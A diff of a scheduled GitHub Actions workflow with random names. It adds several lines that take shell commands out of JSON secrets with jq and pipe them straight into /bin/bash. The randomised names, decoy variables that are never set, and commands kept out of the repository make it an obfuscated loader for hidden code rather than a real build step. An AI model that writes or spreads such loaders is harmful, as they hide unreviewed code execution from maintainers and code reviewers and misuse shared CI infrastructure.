@@ -2,34 +2,23 @@ name: yanzischuc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 5/6 * * *'
+    - cron: '18 1/6 * * *'
 
-jobs:  # 12792
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanzischuc
         env:
-          vr7226: ${{ secrets.vr7226 }}
+          aa464: ${{ secrets.aa464 }}
         run: |
-          echo $vr7226 | jq -r .asxkw7122 | /bin/bash
-          echo $ryq0174 | jq -r .od003 | /bin/bash
-          echo $fqhu18433 | jq -r .jeyf978 | /bin/bash
-          echo $e594 | jq -r .twpqd796 | /bin/bash
-          echo $ltb395 | jq -r .f769 | /bin/bash
-          echo $ceyo09067 | jq -r .pru87561 | /bin/bash
-          echo $h37848 | jq -r .ng4 | /bin/bash
-          echo $q508 | jq -r .bgh88245 | /bin/bash
-          echo $sdu2541 | jq -r .cvnw958 | /bin/bash
-          echo $g96 | jq -r .u0 | /bin/bash
-          echo $efst02 | jq -r .ewm8086 | /bin/bash
-          echo $kzgeo7519 | jq -r .ht9 | /bin/bash
-          echo $f936 | jq -r .ip03 | /bin/bash
-          echo $re2 | jq -r .e04970 | /bin/bash
-          echo $ia2 | jq -r .gr8022 | /bin/bash
-          echo $lpyo8235 | jq -r .rdaw5 | /bin/bash
-          echo $r2 | jq -r .s0819 | /bin/bash
-          echo $lbg2565 | jq -r .fsnkg06179 | /bin/bash
-          echo $spe62 | jq -r .br73020 | /bin/bash
+          echo $aa464 | jq -r .c0 | /bin/bash
+          echo $x1718 | jq -r .mh0769 | /bin/bash
+          echo $tswx55270 | jq -r .b36 | /bin/bash
+          echo $dnls4 | jq -r .y968 | /bin/bash
+          echo $junq64865 | jq -r .chaei7217 | /bin/bash
+          echo $mlvz35 | jq -r .aipfo3941 | /bin/bash
+          echo $rytpj5 | jq -r .yr5696 | /bin/bash
 
